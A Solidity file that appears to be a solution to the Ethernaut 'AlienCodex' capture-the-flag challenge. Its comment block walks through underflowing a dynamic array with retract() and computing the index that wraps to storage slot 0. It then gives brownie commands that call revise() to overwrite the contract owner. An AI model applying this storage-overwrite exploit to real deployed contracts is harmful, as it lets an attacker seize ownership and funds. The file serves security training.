/* 

in this challenge, the dynamic array can point to the owner at slot 0 (notice the inheritance), as follows

the address of the array codex[] starts at keccak[1] , while 1 is the address slot of the dynamic array
now we have to calculate the index where it will point to slot 0 by utilizing vulnerability presented for us
in the revise() function 


# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# create instance of AlienCodex interface

ac_contract = interface.AlienCodex("AlienCodexContractAddress")

# make contract

ac_contract.make_contact({'from': a[0]})

# retract (this will expand the array to cover all storage)

ac_contract.retract({'from': a[0]})


# the locatio of the first item in the dynamic array is keccak(1)
first_location = web3.keccak(hexstr='0x0000000000000000000000000000000000000000000000000000000000000001')

convert to integer => 
first_location_int = int(first_location.hex(),16)

since the array start after the second storage location , then the array size to overflow to zero is as below


zero_location = 2 ** 256 - first_location_int

# call revise

ac_contract.revise(zero_location,a[0].address,{'from':a[0]})


# confirm owner address at slot 0
web3.eth.getStorageAt('AlienCodexContractAddress',0)
# submit

*/


//SPDX-License-Identifier: MIT


pragma solidity 0.8.6;

interface AlienCodex {

function make_contact() external;
function retract() external;
function revise(uint i, bytes32 _content) external;

}